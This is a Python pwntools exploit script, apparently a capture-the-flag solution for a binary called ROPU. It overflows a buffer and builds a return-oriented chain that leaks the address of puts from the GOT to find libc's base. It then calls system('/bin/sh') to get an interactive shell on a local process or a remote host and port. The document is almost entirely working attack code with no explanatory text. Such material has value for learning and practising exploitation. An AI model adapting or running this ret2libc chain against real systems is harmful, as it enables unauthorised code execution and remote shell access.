#!/usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux','splitw','-h']

gdb_bool = True
#gdb_bool = False

def exploit(r):

    #0x0000000000400783 : pop rdi ; ret

    pop_rdi = 0x400783
    puts = 0x400530
    put_got = 0x601018
    main = 0x4006bb
    put_off = 0x6F690
    system_off = 0x45390
    binsh = 0x18CD57

    r.recvuntil("payload!")
    buf =""
    buf += "A"* cyclic_find("faaaaaaa",n=8)
    buf += p64(pop_rdi)
    buf += p64(put_got)
    buf += p64(puts)
    buf += p64(main)

    r.sendline(buf)

    r.recvn(0x2c)
    heh = r.recvn(6) + "\x00\x00"
    puts_addr = u64(heh)
    print("puts: ",hex(puts_addr))

    base = puts_addr - put_off
    print("base : ", hex(base))
    system = base + system_off

    r.recvuntil("payload!")
    bine = base + binsh
    buf2 = ""
    buf2 += "A"* cyclic_find("faaaaaaa",n=8)
    buf2 += p64(pop_rdi)
    buf2 += p64(bine) 
    buf2 += p64(system)
    r.sendline(buf2)


    r.interactive()
    return


if __name__ == "__main__":
    log.info("For remote %s HOST PORT" % sys.argv[0])
    
    binary_name = "./ROPU"        #put binary name here
    e = ELF(binary_name)

    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(binary_name, env={"LD_PRELOAD" : "./libc-2.23.so"})
        print util.proc.pidof(r)
        gdb_cmd = [
            "b *0x4006ad",
            "c"


        ]
        if(gdb_bool):
            gdb.attach(r, gdbscript = "\n".join(gdb_cmd))
            #r =gdb.debug(binary_name, gdbscript = "\n".join(gdb_cmd))
        #r = process("./LOLgame", env={"LD_PRELOAD" : "./libc.so.6.remote"})
        #pause()
        exploit(r)

